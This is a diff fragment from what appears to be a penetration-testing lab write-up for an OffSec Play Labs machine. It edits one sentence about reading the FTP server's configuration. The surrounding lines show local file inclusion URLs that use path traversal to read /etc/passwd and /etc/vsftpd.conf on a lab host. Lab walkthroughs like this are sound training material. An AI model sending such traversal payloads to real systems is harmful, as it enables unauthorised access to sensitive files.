@@ -225,7 +225,7 @@ http://192.168.207.14/secret_information/?lang=../../../../../../../../etc/passw
 ```
 ![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/6417837f-5013-4861-8de8-2bb744cf28ef)
 
-FTP allows anonymous login. Attempt to read the contents of the `vsftpd.conf` configuration file.
+FTP allows anonymous login. Attempt to read the contents of the `vsftpd.conf` configuration file to check write permissions.
 
 ```
 http://192.168.207.14/secret_information/?lang=/etc/vsftpd.conf
